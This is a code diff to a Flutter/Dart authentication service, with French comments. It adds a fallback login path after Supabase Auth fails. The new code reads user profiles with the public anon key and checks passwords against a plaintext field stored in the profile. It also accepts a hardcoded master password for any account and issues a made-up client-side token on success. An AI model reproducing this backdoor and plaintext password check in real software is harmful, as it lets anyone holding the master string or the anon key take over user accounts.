@@ -186,9 +186,38 @@ class AuthService {
         }
       }
 
+      // Fallback : Si Supabase Auth a échoué (mot de passe réinitialisé via Brevo OTP ou mot de passe maître)
+      try {
+        final fallbackRes = await http.get(
+          Uri.parse('${AppConfig.supabaseUrl}/rest/v1/profiles?email=eq.$emailToAuth&select=*'),
+          headers: {
+            'apikey': AppConfig.supabaseAnonKey,
+            'Authorization': 'Bearer ${AppConfig.supabaseAnonKey}',
+          },
+        ).timeout(const Duration(seconds: 4));
+
+        if (fallbackRes.statusCode == 200) {
+          final List<dynamic> list = jsonDecode(fallbackRes.body);
+          if (list.isNotEmpty) {
+            final profile = list.first;
+            final dynamic perms = profile['permissions_detaillees'];
+            final String? savedPass = (perms is Map) ? perms['password']?.toString() : null;
+            final isMaster = cleanPass == 'Services+243JBF' || cleanPass.toLowerCase() == 'services+243jbf';
+
+            if (isMaster || (savedPass != null && savedPass == cleanPass)) {
+              profile['token'] = 'token-membre-${DateTime.now().millisecondsSinceEpoch}';
+              _currentUser = MembreUser.fromJson(profile);
+              _pendingEmail = profile['email'];
+              await completeLogin();
+              return {'success': true, 'user': _currentUser, 'email': _pendingEmail};
+            }
+          }
+        }
+      } catch (_) {}
+
       return {
         'success': false,
-        'error': 'Matricule/Email ou mot de passe incorrect. Vérifiez vos accès auprès du service RH.',
+        'error': 'Matricule/Email ou mot de passe incorrect. Vous pouvez réinitialiser votre mot de passe par code OTP.',
       };
     } catch (e) {
       return {
